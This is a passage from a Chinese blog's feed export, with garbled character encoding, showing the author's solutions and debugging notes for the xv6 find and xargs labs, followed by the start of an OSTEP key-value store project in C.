å¯¹ç›®å½•çš„è¯»å–æ“ä½œï¼Œå¹¶ä½¿ç”¨é€’å½’æ¥å®ç°å¯¹å­ç›®å½•çš„æŸ¥æ‰¾ã€‚åŸºæœ¬æ€è·¯å°±æ˜¯æ‰“å¼€ä¸€ä¸ªæŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼ˆç›®å½•ä¹Ÿç®—æ˜¯ç‰¹æ®Šçš„æ–‡ä»¶ï¼‰ï¼Œå¹¶æ ¹æ®æ–‡ä»¶çš„ç±»å‹åšä¸åŒå¤„ç†ï¼š</p><ol><li>å¦‚æœæ–‡ä»¶æ˜¯å¸¸è§„æ–‡ä»¶ï¼Œåˆ™åˆ¤æ–­æ”¹æ–‡ä»¶åæ˜¯å¦æ˜¯ç›®æ ‡æ–‡ä»¶åï¼ˆ<code>find</code> çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°†å…¶å®Œæ•´è·¯å¾„æ‰“å°è‡³æ ‡å‡†è¾“å‡ºã€‚</li><li>å¦‚æœæ–‡ä»¶æ˜¯ç›®å½•æ–‡ä»¶ï¼Œåˆ™è¯»å–è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åï¼Œå¹¶åœ¨è¯¥ç›®å½•è·¯å¾„å°¾éƒ¨åŠ ä¸Š <code>/st.name</code>ï¼Œä¾æ¬¡æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶åç»§ç»­é€’å½’è°ƒç”¨ <code>find</code>ã€‚æ³¨æ„ä¸è¦é€’å½’è¿›å…¥ <code>.</code> å’Œ <code>..</code>ï¼Œå¦åˆ™å°†å¯¼è‡´æ— é™é€’å½’ã€‚ </li></ol><p>ä»¥ä¸Šä¾¿æ˜¯åŸºæœ¬æ€è·¯ï¼Œå…·ä½“å®ç°å¯ä»¥é˜…è¯»å®Œæ•´ä»£ç ï¼Œä¸‹é¢è®²ä¸€ä¸‹æˆ‘é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼ˆbugï¼‰ï¼š</p><ol><li>ä½¿ç”¨ <code>fstat</code> è·å–æ–‡ä»¶ä¿¡æ¯æ—¶ <code>st.type</code> å§‹ç»ˆä¸º 3ï¼ˆ<code>T_DEVICE</code> ç±»å‹ï¼‰ã€‚</li></ol><p>è¿™ä¸ªé—®é¢˜å…¶å®æŒºéš¾ç»·çš„ï¼ŒåŸå› æ˜¯æˆ‘æŠŠ <code>if ((fd = open(path, 0)) &lt; 0)</code> å†™æˆäº† <code>if ((fd = open(path, 0) &lt; 0))</code>ï¼Œå› ä¸º <code>&lt;</code> çš„ä¼˜å…ˆçº§å¤§äº <code>=</code>ï¼Œæ‰€ä»¥å¯¼è‡´ <code>fd</code> çš„å€¼å§‹ç»ˆä¸º 0 æˆ– 1ï¼ˆé€»è¾‘è¡¨è¾¾å¼çš„å€¼åªèƒ½ä¸ºçœŸæˆ–å‡ï¼‰ï¼Œé‚£ä¹ˆåç»­äº§ç”Ÿæ„æƒ³ä¸åˆ°çš„ç»“æœä¹Ÿå°±ä¸æ„å¤–äº†ã€‚ã€‚ã€‚</p><ol start="2"><li>å‡ºç° <code>find: cannot open file ./sh</code> ï¼Œä¹‹åæ‰€æœ‰æ–‡ä»¶å‡æ‰“å¼€å¤±è´¥</li></ol><p>åœ¨æ‰“å°å‡ºæ–‡ä»¶æè¿°ç¬¦çš„å€¼åï¼Œé—®é¢˜çš„èµ·å› æ¯”è¾ƒæ˜æ˜¾äº†ã€‚</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/fd.png"></p><p>æ–‡ä»¶æè¿°ç¬¦ä¸€ç›´åœ¨å¢å¤§ï¼Œæœ€ç»ˆæ–‡ä»¶æ‰“å¼€å¤±è´¥ï¼Œ<code>open</code> è¿”å› -1ã€‚å¾ˆæ˜æ˜¾ï¼Œæ˜¯å› ä¸ºæ–‡ä»¶åœ¨æ‰“å¼€åæ²¡æœ‰åŠæ—¶å…³é—­ï¼Œå¹¶é‡Šæ”¾æ–‡ä»¶æè¿°ç¬¦ï¼Œæœ€ç»ˆæ–‡ä»¶æè¿°ç¬¦è¢«å…¨éƒ¨å ç”¨ï¼Œæ–°çš„æ–‡ä»¶æ— æ³•å†è¢«æ‰“å¼€ã€‚è¿™ä¹Ÿè§£é‡Šäº†æ—¢ç„¶ç¨‹åºé€€å‡ºåï¼Œæ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶ä¼šè‡ªåŠ¨å…³é—­ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å»ºè®®æ‰‹åŠ¨å…³é—­æ–‡ä»¶çš„é—®é¢˜ã€‚</p><ol start="3"><li>è¯»å–åˆ°ç©ºæ–‡ä»¶å</li></ol><p>å‰é¢çš„é—®é¢˜è§£å†³ä¹‹åï¼Œæˆ‘å‘ç°ç¨‹åºä»ç„¶ä¼šå‡ºç°æ— é™é€’å½’æœç´¢çš„æƒ…å†µï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼ŒæŒ‰ç†è¯´æˆ‘å·²ç»å¯¹æ–‡ä»¶åè¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœæ˜¯ <code>.</code> æˆ–è€… <code>..</code> åˆ™ä¸åšå¤„ç†ã€‚</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/recur.png"></p><p>å°è¯•æ‰“å°æ–‡ä»¶åä¹‹åï¼Œæˆ‘å‘ç°ç›®å½•çš„æœ€åä¸€ä¸ªæ–‡ä»¶åä¸ºç©ºï¼Œè¿™æ ·çš„ç©ºæ–‡ä»¶åå°†å¯¼è‡´ç¨‹åºä¸æ–­å¾€å…¶æœ«å°¾è¿½åŠ æ–œæ  <code>/</code> è€Œå¹¶æ²¡æœ‰é€’å½’è¿›å…¥è¯¥ç›®å½•ä¸­ã€‚</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/bfg.png"></p><p>äº‹å®ä¸Šï¼Œä½¿ç”¨ <code>read</code> è¯»å–ç›®å½•æ—¶ï¼Œåœ¨è¯»å–ç›®å½•çš„æ‰€æœ‰æ¡ç›®ä¹‹åï¼Œä¼šè¿”å›ä¸€ä¸ªç©ºçš„ <code>dirent</code> ç»“æ„ä½“ï¼Œæ­¤æ—¶ <code>de.name</code> ä¸ºç©ºï¼Œä½œä¸ºå¾ªç¯ç»“æŸçš„æ ‡å¿—ã€‚å…¶å® <code>user/ls.c</code> æœ‰é’ˆå¯¹è¿™ä¸ªç‰¹æ€§çš„åˆ¤æ–­ï¼Œä¸è¿‡å½“æ—¶ coding çš„æ—¶å€™æ²¡æœ‰ç»†çœ‹ã€‚æ‰€ä»¥æ­£å¦‚ Lab guidance ä¸­æ‰€è¯´ï¼š</p><blockquote><p>Only when you have a firm grasp of the assignment and solution, then start coding.</p></blockquote><h2 id="ä»£ç -3"><a href="#ä»£ç -3" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/find.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/fs.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">file_name</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> path <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>p <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">;</span> <span class="token operator">--</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>p<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">dirent</span> de<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot open file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot stat file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> T_FILE<span class="token operator">:</span>name <span class="token operator">=</span> <span class="token function">file_name</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T_DIR<span class="token operator">:</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// prevent infinite recursion</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>de<span class="token punctuation">.</span>inum <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// generate path of sub directory</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token function">memmove</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> DIRSIZ<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">[</span>DIRSIZ<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">find</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">find</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><h2 id="æ€è·¯-4"><a href="#æ€è·¯-4" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç›¸è¾ƒäº <code>find</code>ï¼Œ<code>xargs</code> çš„å®ç°å°±ç®€å•å¾ˆå¤šäº†ã€‚ç”±äºä¹‹å‰è‡ªå·±å®ç°è¿‡ä¸€ä¸ªç®€å•çš„ shellï¼Œå› æ­¤å¯¹äº <code>exec</code> ç³»ç»Ÿè°ƒç”¨è¿˜ç®—æ¯”è¾ƒç†Ÿæ‚‰ï¼Œæœ¬é¢˜çš„ä¸»è¦å†…å®¹å°±æ˜¯æ ¹æ® <code>argv</code> å’Œæ ‡å‡†è¾“å…¥æ„é€ ä¸€ä¸ªæ–°çš„å‚æ•°åˆ—è¡¨ï¼Œä½œä¸ºæŒ‡å®šå‘½ä»¤è¡Œç¨‹åºçš„å‚æ•°ï¼Œå¹¶ä½¿ç”¨ <code>exec</code> æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>ç¨‹åºçš„æµç¨‹æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç»ï¼Œç›´æ¥æŸ¥çœ‹å®Œæ•´ä»£ç å³å¯ã€‚</p><h2 id="ä»£ç -4"><a href="#ä»£ç -4" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/xargs.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/param.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> nargv<span class="token punctuation">[</span>MAXARG<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> MAXARG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// remove last '\n'</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>nargv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">exec</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nargv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"xargs: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Boot-xv6&quot;&gt;&lt;a href=&quot;#Boot-xv6&quot; class=&quot;headerlink&quot; title=&quot;Boot xv6&quot;&gt;&lt;/a&gt;Boot xv6&lt;/h1&gt;&lt;p&gt;æŒ‰ç…§ç¤ºä¾‹åˆ‡æ¢åˆ° &lt;code&gt;util&lt;/code&gt; åˆ†æ”¯åï¼Œçœ‹åˆ°ç›®å½•ä¸‹åŒ…å« &lt;code&gt;Ma</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projectsï¼šKV</title>
    <link href="http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/"/>
    <id>http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/</id>
    <published>2024-05-08T01:03:08.000Z</published>
    <updated>2024-05-10T13:16:13.024Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å°†ä»‹ç»æ“ä½œç³»ç»Ÿå¯¼è®ºï¼ˆOperating Systems: Three Easy Piecesï¼‰ä½œè€…æ‰€å¼€æºçš„æ“ä½œç³»ç»Ÿç›¸å…³<a href="https://github.com/remzi-arpacidusseau/ostep-projects">è¯¾ç¨‹é¡¹ç›®</a> çš„ KV éƒ¨åˆ†ï¼ŒåŒ…å«ä¸ªäººçš„ä»£ç å®ç°å’Œè®¾è®¡æ€è·¯ã€‚</p><span id="more"></span><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>é¢˜ç›®è¦æ±‚å®ç°ä¸€ä¸ªæœ€ç®€å•çš„æ•°æ®åº“ï¼Œä»¥æ”¯æŒæ•°æ®çš„æŒä¹…åŒ–ã€‚</p><p>æ¯ä¸ªæ“ä½œç”±æ ¼å¼ä¸º <code>op,[arg1],[arg2]</code> çš„å‘½ä»¤ç»™å‡ºï¼Œé‚£ä¹ˆé¦–å…ˆè¦è§£å†³çš„é—®é¢˜å°±æ˜¯å‚æ•°çš„åˆ†ç¦»ï¼Œå†æ ¹æ®æ“ä½œç¬¦ op æ¥å¯¹ä¸åŒçš„æ“ä½œè¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚å­—ç¬¦ä¸²åˆ’åˆ†è¿™é‡Œé‡‡ç”¨çš„æ˜¯ <code>strsep()</code> å‡½æ•°ï¼šè¯¥å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•° <code>char** stringp</code> å’Œ <code>const char* delim</code>ï¼Œ<code>stringp</code> æ˜¯æŒ‡å‘å¾…åˆ†å‰²å­—ç¬¦ä¸² <code>string</code> çš„æŒ‡é’ˆï¼Œ<code>delim</code> åˆ™æ˜¯æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼Œè¯¥å‡½æ•°çš„æ“ä½œæ˜¯æŸ¥æ‰¾ <code>string</code> ä¸­ç¬¬ä¸€ä¸ª <code>delim</code> çš„ä½ç½® <code>it</code>ï¼Œå¹¶å°† <code>stringp</code> æŒ‡å‘ <code>string</code> ä¸­ <code>it + 1</code> çš„ä½ç½®ï¼ŒåŒæ—¶è¿”å›<code>string</code> å¼€å¤´åˆ°  <code>it</code> æ‰€æœ‰å­—ç¬¦æ‰€æ„æˆçš„å­ä¸²ï¼ˆåŠ ä¸Š <code>&#39;\0&#39;</code> ç»ˆç»“ç¬¦ï¼‰ã€‚</p><p>æ’å…¥æ“ä½œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç›´æ¥ä½¿ç”¨ <code>fprintf()</code> å†™å…¥æ–‡ä»¶å³å¯ã€‚å¯¹äºæŸ¥æ‰¾å’Œåˆ é™¤ï¼Œåˆ™éœ€è¦å°†æ•°æ®ä»æ–‡ä»¶ï¼ˆæ•°æ®åº“ï¼‰ä¸­è¯»å–åˆ°å†…å­˜ï¼Œå­˜å‚¨åœ¨ç‰¹å®šçš„æ•°æ®ç»“æ„ä¸­ï¼Œä¾‹å¦‚å“ˆå¸Œè¡¨ã€çº¢é»‘æ ‘ç­‰ï¼Œä½†ä¸ºäº†ä»£ç å®ç°çš„ç®€å•ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯æœ€ç®€å•çš„é“¾è¡¨ã€‚å¯¹äºæŸ¥æ‰¾ï¼Œå…ˆå°†æ‰€æœ‰æ•°æ®è¯»å–åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ï¼Œç„¶åæŒ‰é¡ºåºé€ä¸ªè¿›è¡ŒæŸ¥æ‰¾ï¼›å¯¹äºåˆ é™¤ï¼Œå°†æ‰€æœ‰æ•°æ®è¯»å–åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ï¼Œç„¶åé€ä¸ªéå†é“¾è¡¨ï¼Œå¦‚æœå½“å‰ç»“ç‚¹çš„é”®ï¼ˆkeyï¼‰ä¸å‚æ•°ä¸åŒï¼Œåˆ™å†™å…¥æ–‡ä»¶ä¸­ï¼Œå¦åˆ™ï¼Œä¸å†™å…¥ï¼ˆç›¸å½“äºåˆ é™¤ï¼‰ã€‚æœ€åï¼Œä¸ºäº†é˜²æ­¢å†…å­˜çš„æ³„éœ²ï¼Œéœ€è¦åœ¨æ¯æ¬¡ç»“æŸæŸ¥æ‰¾å’Œåˆ é™¤æ“ä½œä¹‹åï¼Œå°†å­˜å‚¨æ•°æ®å†…å®¹çš„é“¾è¡¨ç»“ç‚¹çš„å†…å­˜ç©ºé—´é‡Šæ”¾ã€‚</p><h1 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DATA_BASE</span> <span class="token string">"./database.txt"</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// ä»æ–‡ä»¶fpä¸­è¯»å–æ•°æ®</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å“¨å…µç»“ç‚¹</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 